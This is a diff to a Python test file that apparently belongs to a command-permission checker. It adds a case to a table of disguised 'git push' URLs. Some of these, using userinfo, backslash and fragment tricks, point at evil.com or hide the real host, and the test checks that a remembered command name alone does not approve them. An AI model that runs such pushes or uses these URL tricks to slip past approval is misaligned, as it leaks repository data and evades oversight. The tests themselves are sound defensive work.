@@ -88,6 +88,7 @@ def test_the_child_environment_makes_git_refuse_found_bare_repos(monkeypatch):
     ("shell:git push", "git push http://evil.com@127.0.0.1:8787/x"),        # userinfo and odd hosts ask
     ("shell:git push", "git push https://127.0.0.1\\@evil.com/x"),
     ("shell:git push", "git push https://example.com#@127.0.0.1/"),
+    ("shell:git push", "git push 127.0.0.1:repo"),                          # scp-style host:path, no slash
 ])
 def test_a_remembered_name_is_not_enough(trusted, cmd, cfg):
     cfg.trusted.add(trusted)
